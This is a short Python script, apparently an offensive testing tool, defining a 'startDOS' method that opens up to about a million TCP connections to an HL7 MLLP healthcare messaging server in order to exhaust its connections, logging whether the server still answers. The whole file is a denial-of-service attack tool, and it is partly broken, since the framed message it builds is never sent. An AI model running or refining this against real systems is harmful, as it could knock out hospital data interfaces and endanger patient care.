import socket
import logging

consoleOuputFileName = "hl7_exhaust.log"
logging.basicConfig(filename=consoleOuputFileName,level=logging.DEBUG,filemode='w')

class exhaust:
    def startDOS(self,host,port):

        message="MSH"
        for i in range (1,999999):
            try:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                conn.settimeout(1)
                conn.connect((host, int(port)))

                # start and end block - used to define start and End of message in MLLP
                start_block = b'\x0b'
                end_block = b'\x1c'
                carriage_return = b'\x0d'

                # create message here
                msg = start_block.decode() + message + end_block.decode() + carriage_return.decode()

                try:
                    ack = conn.recv(4096)
                    logging.debug(ack)
                    if ack:
                        writeAck = ack.decode()
                        logging.debug("Alive! "+writeAck)
                        continue
                    else:
                        logging.debug("Exhausted all connections")
                except socket.timeout as e:
                    return e

            except socket.error as e:
                logging.debug("Exhausted all connections"+ str(e))

